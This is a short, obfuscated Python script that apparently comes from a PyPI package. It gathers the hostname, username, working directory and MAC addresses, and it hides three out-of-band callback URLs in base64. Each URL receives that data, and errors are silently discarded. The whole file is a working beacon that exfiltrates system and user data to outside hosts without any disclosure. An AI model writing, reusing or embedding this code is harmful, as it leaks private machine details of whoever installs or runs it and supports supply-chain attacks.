import platform as pltfrm
import getpass as gtps
import os as osys
import urllib.parse as uprs
import urllib.request as urqt
import random as rndm
import subprocess as sbprc
import base64 as b64

def g_m_a():
    m_a = []
    sys = pltfrm.system()

    if sys == "Windows":
        out = sbprc.check_output("getmac", shell=True).decode()
        for ln in out.splitlines():
            if "Physical" in ln:
                mc = ln.split()[0]
                m_a.append(mc)

    elif sys == "Linux" or sys == "Darwin":
        out = sbprc.check_output("ifconfig", shell=True).decode()
        for ln in out.splitlines():
            if "ether" in ln:
                mc = ln.split()[1]
                m_a.append(mc)

    return m_a

def m():
    hstnm = pltfrm.node()
    usrnm = gtps.getuser()
    cur_pth = osys.getcwd()
    r_n = rndm.randint(10000, 99999)
    m_a = g_m_a()
    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')

    urllst = [
        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),
        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),
        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')
    ]

    for url in urllst:
        prmtrs = {
            "hostname": hstnm,
            "username": usrnm,
            "dir": cur_pth,
            "mac_address": b64_m_a
        }
        f_url = f"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}"
        try:
            with urqt.urlopen(f_url) as rspns:
                pass
        except Exception as ex:
            pass

if __name__ == "__main__":
    m()